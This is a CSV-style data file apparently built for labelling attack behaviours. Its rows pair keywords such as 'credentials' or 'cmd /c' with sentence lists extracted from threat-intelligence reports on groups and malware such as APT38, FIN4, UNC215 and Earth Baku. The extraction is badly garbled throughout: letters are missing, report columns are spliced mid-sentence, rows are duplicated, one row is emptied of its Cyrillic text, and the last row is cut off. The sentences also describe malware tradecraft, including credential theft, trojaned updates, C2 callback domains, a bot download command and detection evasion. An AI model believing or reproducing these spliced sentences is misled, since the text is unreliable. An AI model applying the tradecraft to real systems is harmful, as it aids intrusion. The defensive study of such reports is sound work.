5d9861a26c9cd5bdcb58921a7b6843d1,credentials,1.0,"['It is, however, unconfirmed Malicious Legitimate whether the domain update.alyac.org resolved to CDN CDN the South Korean IP adres at the time of the atack.', '(ESTsoft, 201) (Samsung IDC, 201) (ETnews, 201) Betwen 18 July 201 and 25 July 201, the 1.', 'Atacker modifies the ALZip update server.', 'atackers used the infected computers to colect 2.', 'Computers check for ALZipsoftwareupdates and are aditional internal aces information and database redirected to a Content Delivery Network (CDN).', 'credentials.', 'They presumably used a file named 3.', 'Nontargeted computers download alegitimate x.exe17to acquire some of this information, after update from the ESTsoft CDN.', 'Targeted computers download a trojaned update from the atackers downloading it onto infected computers from a malicious CDN.', 'tolbox they had earlier set up.', 'Based on the behaviour of this file, the atackers likely used it to FIGURE1DEPICTIONOFHOWTHEALZIPUPDATE conduct network enumeration and to obtain SERVERWASUSEDINTHEATACK This specific targeting of SK Comunications indicates the targeting wasnt purely oportunistic.']"
5d9861a26c9cd5bdcb58921a7b6843d1,credentials,1.0,"['It is, however, unconfirmed Malicious Legitimate whether the domain update.alyac.org resolved to CDN CDN the South Korean IP adres at the time of the atack.', '(ESTsoft, 201) (Samsung IDC, 201) (ETnews, 201) Betwen 18 July 201 and 25 July 201, the 1.', 'Atacker modifies the ALZip update server.', 'atackers used the infected computers to colect 2.', 'Computers check for ALZipsoftwareupdates and are aditional internal aces information and database redirected to a Content Delivery Network (CDN).', 'credentials.', 'They presumably used a file named 3.', 'Nontargeted computers download alegitimate x.exe17to acquire some of this information, after update from the ESTsoft CDN.', 'Targeted computers download a trojaned update from the atackers downloading it onto infected computers from a malicious CDN.', 'tolbox they had earlier set up.', 'Based on the behaviour of this file, the atackers likely used it to FIGURE1DEPICTIONOFHOWTHEALZIPUPDATE conduct network enumeration and to obtain SERVERWASUSEDINTHEATACK This specific targeting of SK Comunications indicates the targeting wasnt purely oportunistic.']"
12908f433b01cf592cf249e187ada118,credentials,1.0,"['counsel, and investment of public companies.', 'email corespondence.', 'comon investor and They also have banking.', 'Aproximately shareholder concerns, mechanisms to organize two-thirds of the enticing the intended the data they colect targeted organizations victims into opening the and have taken steps to are healthcare and weaponized document evade detection.', 'pharmaceutical and entering their email companies.', 'credentials.', '3 fireye.com Hacking the Stret?', 'FIN4 Likely Playing the Market APLYING WAL STRET KNOW-HOW: FIN4S TARGETS F ireEye believes FIN4 intentionaly targets In order to get useful inside information, FIN4 individuals who have inside information compromises the email acounts of individuals about impending market catalystsevents who regularly comunicate about market- that wil cause the price of stocks to rise or fal moving, non-public maters.', 'substantialy in a short period of time.', 'Since at least mid-2013, FIN4 has pursued targets at FIN4 frequently targets: more than 10 organizations, over two-thirds of which are public healthcare and pharmaceutical C-level executives and senior leadership companies.', 'The remaining targets include Legal counsel advisory firms that represent public companies Regulatory, risk, and compliance personel and a handful of public companies in other Researchers sectors closely folowed by market watchers.']"
937861461df2c64583166f4eebf3ee45,credentials,1.0,"['/aps/: This main directory contains stolen victim data, along with several PHP scripts that uploaded it to the server.', 'It used the format, /aps/A[3 nums]X/[COMPUTERNAME_USERNAME] where A[3 nums]X represents a particular subcampaign while /[COMPUTERNAME_USERNAME] identifies a unique victim.', 'The thre digits in the folder format sem to indicate the month of the year, as they ranged from 01 to 012.', 'Further analysis of the dates when the data was stolen, however, disproved that theory.', 'An exhaustive analysis of every file on the server is beyond the scope of this paper but the details of the most interesting components are: 9 | Page 2015 Trend Micro Incorporated Operation Arid Viper Research Paper /aps/A[3 nums]X/ison.on: This refers to FileList.txt: List of files in a directory the last time stolen data was uploaded in on an infected system, frequently the format, d-m-y-h-m-s. where the malware was executed.', '/aps/A[3 nums]X/data/: This contains pdata.txt: List of stolen website login screnshots taken from infected systems, credentials.', 'along with the folowing files, the presence webrowser.txt: List of stolen web of which varied from victim to victim: browser credentials.', 'alips.txt: Contains victims local and wifi.txt: List of stolen Wi-Fi conection external IP adreses.', 'credentials.', 'CurentProces.txt: List of runing workdata.txt: Contains the infection proceses on infected systems.', 'date, OS, user domain name, cmpinf.txt: Contains the infection username, and a line labeled AP_ date, OS, user domain name, and PATH=, which indicates which directory username.']"
937861461df2c64583166f4eebf3ee45,credentials,1.0,"['/aps/: This main directory contains stolen victim data, along with several PHP scripts that uploaded it to the server.', 'It used the format, /aps/A[3 nums]X/[COMPUTERNAME_USERNAME] where A[3 nums]X represents a particular subcampaign while /[COMPUTERNAME_USERNAME] identifies a unique victim.', 'The thre digits in the folder format sem to indicate the month of the year, as they ranged from 01 to 012.', 'Further analysis of the dates when the data was stolen, however, disproved that theory.', 'An exhaustive analysis of every file on the server is beyond the scope of this paper but the details of the most interesting components are: 9 | Page 2015 Trend Micro Incorporated Operation Arid Viper Research Paper /aps/A[3 nums]X/ison.on: This refers to FileList.txt: List of files in a directory the last time stolen data was uploaded in on an infected system, frequently the format, d-m-y-h-m-s. where the malware was executed.', '/aps/A[3 nums]X/data/: This contains pdata.txt: List of stolen website login screnshots taken from infected systems, credentials.', 'along with the folowing files, the presence webrowser.txt: List of stolen web of which varied from victim to victim: browser credentials.', 'alips.txt: Contains victims local and wifi.txt: List of stolen Wi-Fi conection external IP adreses.', 'credentials.', 'CurentProces.txt: List of runing workdata.txt: Contains the infection proceses on infected systems.', 'date, OS, user domain name, cmpinf.txt: Contains the infection username, and a line labeled AP_ date, OS, user domain name, and PATH=, which indicates which directory username.']"
96fd97a150c9d778ce91b979a107dec6,credentials,1.0,"['other brands (some legitimate and some that are likely fictitious Potentialy harmful domain registrations and typosquats can busineses).', 'Domain registrations and typosquats can enable enable spearphishing campaigns or redirects that pose an spearphishing campaigns or redirects that pose a threat to victim elevated risk to a companys brand or employes.', 'A sucesful networks and brands.', 'spearphish is dependent on factors such as the quality of the Using a combination of proactive adversary infrastructure mesage, the credibility of the sender adres, and, in the case detections, domain analysis techniques, and Recorded Future of a redirecting URL, the credibility of the domain name.', 'Insikt Network Trafic Analysis, we have determined that NOBELIUMs Group has previously observed other Rusian nexus groups using use of SOLARDEFLECTION infrastructure overlaps with other typosquating in suport of operations, such as those aimed comon infrastructure tactics, techniques, and procedures at the 2020 presidential elections, to increase confidence in (TPs) previously atributed to the group by multiple the validity of the fraudulent login portal used to harvest victim organizations including Microsoft, Fortinet, Sekoia, and Volexity.', 'credentials.', 'This tactic has also ben reported recently in Previous open source reporting also highlighted NOBELIUMs use open sources in conection with intrusions targeting entities in of cracked versions of the Cobalt Strike penetration testing tol.', 'Ukraine, likely in suport of Rusias invasion of the country.', '1 CTA-202-0503 Recorded Future | w.recordedfuture.com CYBER THREAT ANALYSIS Figure 1: SOLARDEFLECTION Domain Registration reference in the Recorded Future Platform (Source: Recorded Future) Insikt Group aseses that NOBELIUM is a threat activity The Recorded Future Platform automaticaly detects group operating in line with the objectives of Rusias Foreign typosquated domains; each newly created domain entity is Inteligence Service (SVR).', 'The SVR is tasked with providing the evaluated for typosquating-style similarity to other domains president of the Rusian Federation, the Federal Asembly, and observed by Recorded Future.', 'An example of this is the the government with the inteligence they ned to make decisions SOLARDEFLECTION typosquat displayed in Figure 1, which in the areas of politics, the economy, military strategy, scientific- based on the domains speling was very likely an atempt by technical strategy, and the environment.']"
0598e0f51fd713c67907b5e7d0e07560,credentials,0.9629928998342752,"['It (key HKLM\\Software\\JavaSoft, value Suplement) and also colects information about visited websites, starts the malware using the duplicated proces token.', 'i.e., browsing history.', 'Cosmu copies itself with a couple of diferent filenames Firefox to %WINDIR%\\system32.', 'The binaries on the disk have a Cosmu steals saved credentials and the asociated variable length of zero-pading but they are al esentialy URLs from Firefox.', 'The malware does not decrypt copies of the original malware binary.', 'the credentials.', 'The filenames for both the Cosmu copies and the service y Email clients binary are generated by randomly taking two items from Thunderbird the folowing list and concatenating them, resulting in Cosmu steals saved credentials and the asociated filenames like usbmon.exe, urlsa.exe, and rasdns.exe: mail server hostnames from Thunderbird.', 'The y nt y fw y env malware does not decrypt the credentials.', 'y inf y pc y lib Bat email client y svc y ctf y udf Cosmu steals credentials from Bat email client y ras y mon y wm by parsing acount.cfn and decrypting the y ptp y pdb y win credentials.', 'y obj y ms y id y net y cpl y wdm Outlok Expres y host y sys y mgr Cosmu steals saved credentials and information y lsa y ui about the asociated mail server from Outlok y cms y schd Expres.', 'y dsp y tapi Outlok y sql y eng Cosmu steals saved credentials and information y dhcp y cfg about the asociated mail server from Outlok.']"
b70970096977380c3182b87c864fceaf,credentials,1.0,"['Analysis of THE MANUAL Cyber Reality: A Ransomware Operators Playbok Copyright Xservus Limited PUBLIC Version 1.1 Contents Document Control .', '4 Forward .', '4 Introduction .', '5 The Manual: Get yourself a VPS.', '.', '7 The Manual: Geting Started.', '7 The Manual: On The KALI Server .', '7 The Manual: Atacking CISCO VPN Services .', '7 Pentester Considerations .', '9 Credentials .']"
5d9861a26c9cd5bdcb58921a7b6843d1,operating system information,0.8783849880571661,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
5d9861a26c9cd5bdcb58921a7b6843d1,operating system information,0.8783849880571661,"['These domains include is to create.', ""In this instance, the configured named bs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dl, as shown in Figure 2."", ""Due to the w.adv138mail.com'32."", 'namebeing configurable, theRAT wilnot alwaysbe caled winsvcfs.dl.', 'The configuration block also The RAT has many diferent capabilities and contains a calback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares comand and control comunications.', 'operating system.', ""The RAT's behaviour changes The calback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is instaled on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are instaled.', 'Modules used by the RAT deployed to the SK Comunications network If no configuration is specified, the malware include: uses default values instead.', 'The default calback location hardcoded into the malware is the private IP adres, 192.168.0.20.', 'This adres is not 28Theprocesvchost.exe is agenerichostprocesforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLs.']"
7856ebf4259ae125d28e1268047ceb06,"system information,",1.0,"['impactful users, based on the level of risk to the frequently triger investigations by security security violation or a potential security violation.', 'organization if they become compromised.', 'operations/analysts.', 'authorization atack surface A proces of determining whether a subject is botnet analyst An information systems characteristics that permit alowed to have the specified types of aces to a A colection of computers compromised by Also known as cybersecurity analyst, a comon role an adversary to probe, atack, or maintain presence particular resource.', 'This action is typicaly done by malicious code and controled acros a network.', 'within an organizations SOC team that investigates, in the information system.', 'evaluating aplicable aces control information alerts, or hunts for adversary activities.', 'such as aces control lists.', 'In modern cybersecurity aproaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat inteligence.', 'Microsoft Digital Defense Report | September 2020 83 TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSARY breach ciphertext data estate encryption Any incident that results in unauthorized aces of Data or information in its encrypted form used The procedures, services, and infrastructure used to The proces of transforming plaintext into data, aplications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes refered manage corporate data in the digital estate.']"
9a29098cbdbdba8ece965c0fbe56f6fd,downloading,0.86023137403023,"['""ER:1"" the number of parameters #wget Bot acepts two parameters: URL and is not equal to 3. hp:/w.', 'file name.', 'When /d flag is present, does constitution.', '""Save/Get failed"" eror while nothing.', 'Changes date and time of file org/usdeclar.', 'downloading the file.', 'creation, last aces, and last change to txt text.txt the date from the similar field ""kernel32.', '""Saved"" the file is downloaded and dl"".', 'saved #ver Get the bot version.', '""0.2.21.01_srv_i86"" #ver #p Refresh time of the last response/cal to No response #p the server.', 'The comand is meaningles because refreshing is automated and hapens upon receiving/acepting the mesage from the server.']"
9a29098cbdbdba8ece965c0fbe56f6fd,downloading,0.86023137403023,"['""ER:1"" the number of parameters #wget Bot acepts two parameters: URL and is not equal to 3. hp:/w.', 'file name.', 'When /d flag is present, does constitution.', '""Save/Get failed"" eror while nothing.', 'Changes date and time of file org/usdeclar.', 'downloading the file.', 'creation, last aces, and last change to txt text.txt the date from the similar field ""kernel32.', '""Saved"" the file is downloaded and dl"".', 'saved #ver Get the bot version.', '""0.2.21.01_srv_i86"" #ver #p Refresh time of the last response/cal to No response #p the server.', 'The comand is meaningles because refreshing is automated and hapens upon receiving/acepting the mesage from the server.']"
42e04862255f80afab5064fac5b17dc5,evade detection,1.0,"['This coincides with and financial entities since at least 20141.', ""In late 2015, APT38's targeting of organizations in Southeast Asia, their operations escalated as they atempted to conduct including entities located in Vietnam, Malaysia, and the fraudulent transactions for the first time."", 'Throughout 2016, Philipines throughout 2016.', 'The DOJ complaint also APT38 pursued geographicaly diverse targets at a notable detailed adversary use of a shared pasword betwen rate.', 'While APT38 is financialy motivated, we believe Bangladesh Bank, the African bank and Southeast Asian that in certain instances, they targeted entities solely for bank, providing evidence of further TP overlap with infrastructure to facilitate folow-on operations or help APT38.', 'evade detection.', 'Per public reporting, threat actors targeted Banco del During our review, multiple public incidents have ben Austro in Ecuador with fraudulent SWIFT transactions reportedly linked to this body of activity based largely in 2015.', 'While we have limited insight into this targeting, on their targeting of SWIFT systems.', 'We are curently we have identified APT38 targeting South American tracking a variety of suspected events that have varying entities previously.', 'degres of asociations to APT38.', 'Although we canot In August 2018, threat actors targeted Cosmos confirm these instances were conducted by APT38, we Bank in India using both fraudulent ATM and SWIFT have observed some overlaps betwen these publicly transactions.']"
42e04862255f80afab5064fac5b17dc5,evade detection,1.0,"['This coincides with and financial entities since at least 20141.', ""In late 2015, APT38's targeting of organizations in Southeast Asia, their operations escalated as they atempted to conduct including entities located in Vietnam, Malaysia, and the fraudulent transactions for the first time."", 'Throughout 2016, Philipines throughout 2016.', 'The DOJ complaint also APT38 pursued geographicaly diverse targets at a notable detailed adversary use of a shared pasword betwen rate.', 'While APT38 is financialy motivated, we believe Bangladesh Bank, the African bank and Southeast Asian that in certain instances, they targeted entities solely for bank, providing evidence of further TP overlap with infrastructure to facilitate folow-on operations or help APT38.', 'evade detection.', 'Per public reporting, threat actors targeted Banco del During our review, multiple public incidents have ben Austro in Ecuador with fraudulent SWIFT transactions reportedly linked to this body of activity based largely in 2015.', 'While we have limited insight into this targeting, on their targeting of SWIFT systems.', 'We are curently we have identified APT38 targeting South American tracking a variety of suspected events that have varying entities previously.', 'degres of asociations to APT38.', 'Although we canot In August 2018, threat actors targeted Cosmos confirm these instances were conducted by APT38, we Bank in India using both fraudulent ATM and SWIFT have observed some overlaps betwen these publicly transactions.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt,1.0,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
3ecd520432fea7b187f4b357491e4b68,anti-virus software information,0.8360618961060073,"['Create a lnk file named xBoxOne.lnk in the temporary directory.', 'This file requests the execution of a remote script file.', 'The URL adres is hxps: /bit [.]', 'ly/2xMHylE.', 'Then move the file to the startup directory for persistent residency.', 'c. Anti-virus software detection.', 'd. Decrypt and release the file named qjqykntc.vbs to the users temporary directory, and then execute it.', 'Anti-virus software detection is as folows, traversing the curent system proces through the wmi interface.', 'If a kwsprot proces (Kingsoft AntiVirus) or nprot proces (NPAV anti-virus protection) is detected, use cscript.exe to execute subsequent landing vbscript; otherwise use wscript.exe engine (It is conjectured that its for dynamic kil-fre procesing).', 'Then proced to find the name of the Anti-virus software proces.', 'If a proces containing hudongf (360 active defense) or a qhsafe proces (360 Anti-virus software components) is detected, the lnk file created in the temporary directory is deleted; otherwise, the normal execution is performed.']"
9e8922efde07801a544df9fd30c6ce70,anti-virus software information,0.7602020262107254,"['Description Cyber threat actors are using an SMB worm to conduct cyber exploitation activities.', 'This tol contains five components a listening implant, lightweight backdor, proxy tol, destructive hard drive tol, and destructive target cleaning tol.', 'The SMB worm propagates throughout an infected network via brute-force authentication atacks, and conects to a C2 infrastructure.', 'Impact Due to the highly destructive functionality of this malware, an organization infected could experience operational impacts including los of intelectual property and disruption of critical systems.', 'Solution Users and administrators are recomended to take the folowing preventive measures to protect their computer networks: Use and maintain anti-virus software Anti-virus software recognizes and protects your computer against most known viruses.', 'It is important to kep your anti-virus software up-to-date (se Understanding Anti-Virus Software for more information).', ""Kep your operating system and aplication software up-to-date Instal software patches so that atackers can't take advantage of known problems or vulnerabilities."", 'Many operating systems ofer automatic updates.', 'If this option is available, you should enable it (se Understanding Patches for more information).', 'Review Security Tip Handling Destructive Malware #ST13-03 and evaluate their capabilities encompasing planing, preparation, detection, and response for such an event.', 'Review Recomended Practices for Control Systems, and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies (pdf).']"
564c219dc0a2c3edd2eed08025387d9d,anti-virus software information,0.8132155763768063,"['Hosts file: Retrieve and send / etc/hosts file contents.', 'Instaled Software: Exfiltrate details of instaled software from registry.', 'Execution: Run arbitrary comands on the endpoint via cmd.exe.', 'Clipboard: Get and set clipboard data.', 'Sysinfo: The folowing informa- tion is sent to the C2 to finger- print the endpoint: IP and MAC adreses.', 'Instaled anti-virus software.', 'Procesor and GPU info, RAM info, system uptime, OS details, batery charge and life.', 'Figure 9: DetaRAT comand codes.', 'Hostname, curent username and scren dimensions.', '2021 Cisco.', 'Al rights reserved.']"
31347d89b18461f35448b26fefb00133,cmd /c,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,cmd /c,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /c,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
0d16866e038b536ca4f0c6571a6cb84e,"decrypting,",0.7989849760451059,"['Every multiple APT groups operate under, or are resourced by, the ShadowPad sample that we have sen has a rot module same digital quartermaster canot be ruled out for various designed to orchestrate the next set of modules, including a sets of threat actors.', 'In 2021, we continued to observe plugins module that can then be customised depending on this phenomenon, whether through observations of shared the functionality that the threat actor requires.', 'The plugins capability (malware, techniques, exploits, and so on), or can enable capabilities that may include, among others, C2 through overlaps in infrastructure (either through the same comunications over HTP or TCP, keyloging, screnshot paterns observed on C2s, or the reuse of domains/IPs by gathering, port maping, and system information gathering.6 other threat actors).', 'In tracking standard ShadowPad samples in 2021, Of Shadows and Proxies: China-based threat actors we identified and analysed a new variant, which we sharing tols cal ScaterBe: samples of ShadowPad that had ben The continued sharing of tols and techniques is a runing obfuscated using a custom technique.7 Likely in order to theme among China-based threat actors.', 'While not al of the minimise detection on victim networks, the ScaterBe China-based threat actors share tols with one another, and packing mechanism implements control flow obfuscation, not al of them have aces to the same tols, quartermaster string encoding, dynamic API resolutions, several anti- arangements (covered in more detail in a later section) analysis techniques, as wel as shelcode decoding/ continue to complicate atribution of activity.', 'For example, decrypting.', 'We ases that one or more users of ShadowPad the same malware families (such as PlugX, PoisonIvy, have aces to ScaterBe, and have highly likely delivered ShadowPad, Quarian, and the Winti backdor) are used by some of these malicious payloads via watering hole atacks multiple China-based threat actors, and, as has become very on sites that are used to deliver Adobe Flash update files.', 'We wel known in 2021 with the ProxyLogon incidents, some ases that most ScaterBe payloads can be directly linked threat actors share exploits as wel.', 'back to the threat actor we track as Red Dev 10 (aka Earth Lusca), and have ben used to target organisations in the We note that while not al of these threat actors have ben aerospace and defence sectors.', 'observed having aces to the shared tols detailed below, these are prime examples of the dynamic We ases ShadowPad to be highly likely used by at least described in this section.', '1 China-based threat actors.8 Our analysis into specific subsets of ShadowPad infrastructure alowed us to identify a wide set of victims, ranging from India-based entities in the telecomunications and oil and gas sectors, to East Asian branches of international humanitarian organisations.']"
94b3c57a6c853ad63fad5d7f185e7fcb,"The operators made a consistent effort to
delete these tools and remove any residual forensic artifacts from
compromised systems.",0.7751695975682903,"['During this time, UNC215 used new TPs to hinder atribution and detection, maintain operational security, employ false flags, and leverage trusted relationships for lateral movement.', 'We believe this adversary is stil active in the region.', 'Atack Lifecycle Betwen 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shels, and then FOCUSFJORD payloads to select government and academic targets in the Midle East and Central Asia.', 'After gaining initial aces, the operators conduct credential harvesting and extensive internal network reconaisance.', 'This includes runing native Windows comands on compromised servers, executing ADFind on the Active Directory, and scaning the internal network with numerous publicly available tols and a non-public scaner we named WHEATSCAN.', 'The operators made a consistent efort to delete these tols and remove any residual forensic artifacts from compromised systems.', 'In another incident response investigation, UNC215 pivoted to multiple OWA servers and instaled web shels.', 'In the folowing days, the operators interacted with these web shels from internal IP adreses, atempting to harvest credentials.', 'After identifying key systems within the target network, such as domain controlers and Exchange servers, UNC215 moved lateraly and deployed their signature malware FOCUSFJORD.', 'UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information colection capabilities such as scren capture and keyloging.', 'While UNC215 heavily relies on the custom tols FOCUSFJORD and HYPERBRO, Chinese espionage groups often have resource sharing relationships with other groups, and we do not have enough information to determine if these tols are developed and used exclusively by UNC215.']"
94b3c57a6c853ad63fad5d7f185e7fcb,"to delete any remaining FOCUSFJORD
forensic evidence, including files on disk, configuration data
encrypted in the registry, and related services and registry keys
used for persistence.",0.9026474660879926,"['The operators deleted tols used for credential harvesting and internal reconaisance including a custom scaner dubed WHEATSCAN after use.', 'The first FOCUSFJORD payload delivered to a system contains a blob that includes C2 and other configuration data.', 'On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the systems registry, sets up a persistence mechanism and then rewrites itself on disk without the embeded configuration and with limited functionality to only read configuration data.', 'This proces enables the operators to obfuscate the configured C2 servers from automated sandbox runs or disclosure in public file scaning services.', 'A newly identified utility dubed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.', 'The tol can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence.', 'Exploiting Trust Relationships UNC215 leveraged trusted third parties in a 2019 operation targeting an Israeli government network.', 'As ilustrated in Figure 2, the operators were able to aces their primary target via RDP conections from a trusted third party using stolen credentials and used this aces to deploy and remotely execute FOCUSFJORD on their primary target.', 'htps:/w.fireye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 3/15 8/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc htps:/w.fireye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html 4/15 8/16/2021 UNC215: Spotlight on a Chinese Espionage Campaign in Israel | FireEye Inc Figure 2: Two FOCUSFJORD samples configured to proxy C2 trafic Concealing C2 Infrastructure UNC215 made technical modifications to their tols to limit outbound network trafic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network trafic.', 'The folowing are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay comunications to their C2 servers.', 'We do not have enough context about the folowing samples to atribute al of them to UNC215, though they are representative of activity we have sen from the group.']"
9dfd4e4ee0b137307871d958fcbbc521,"to obfuscate the source of the
activity.",0.7754669974943361,"['Permision Groups Discovery: The actor atempt to find local system T1069.01 Local Groups groups and permision setings.', 'Permision Groups Discovery: The actor used comands to enumerate T1069.02 Doman Groups the active directory structure.', 'System Network Configuration The actor used comands to enumerate T1016 Discovery the network topology.', 'Comand and Control The actor used comands to enable port Proxy T1090 forwarding on the host.', 'The actor used compromised SOHO Proxy: External Proxy T1090.02 devices (e.g.', 'routers) to obfuscate the source of their activity.', 'TLP:CLEAR U/O/156893-23 | P-23-143 | JUN 2023 Ver.', '1.1 24']"
88d674726f92a0b205d41f6b44c23d24,computer name,0.9939697234121188,[]
88d674726f92a0b205d41f6b44c23d24,computer name,0.9939697234121188,[]
272d3c74c836029cd04557377079991e,computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
272d3c74c836029cd04557377079991e,computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web 